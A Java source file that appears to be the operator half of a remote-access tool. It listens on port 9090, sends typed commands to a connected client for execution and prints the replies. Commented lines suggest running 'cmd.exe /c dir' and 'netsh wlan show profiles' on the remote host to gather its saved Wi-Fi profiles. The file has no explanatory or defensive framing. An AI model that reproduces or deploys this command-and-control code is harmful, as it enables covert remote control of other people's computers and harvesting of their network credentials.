import javax.imageio.ImageIO;
import javax.swing.*;
import java.awt.*;
import java.awt.image.BufferedImage;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.nio.ByteBuffer;
import java.util.Date;
import java.util.Scanner;

import static java.lang.Thread.sleep;

public class Main {
    public static void main(String[] args) throws IOException, InterruptedException {
        ServerSocket listener = new ServerSocket(9090);
        try {
            Socket socket = listener.accept();
            recv(socket);
            while (true) {
                String command = "cmd.exe /c dir";/*JOptionPane.showInputDialog("enter the command you want the client to run");*/
                Scanner reader = new Scanner(System.in);  // Reading from System.in
                System.out.println("Enter a command: ");
                command = reader.nextLine();//"cmd.exe /c netsh wlan show profiles";
                PrintWriter out =
                        new PrintWriter(socket.getOutputStream(), true);
                out.println(command);
                sleep(1000);
            }
        } finally {
            listener.close();
        }
    }

    private static void recv(Socket socket) {

        Thread thread = new Thread() {
            public void run() {
                while (true) {
                    BufferedReader input =
                            null;
                    try {
                        input = new BufferedReader(new InputStreamReader(socket.getInputStream()));
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    try {
                        String answer = input.readLine();
                        System.out.println(answer);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
            }
        };
        thread.start();
    }
}

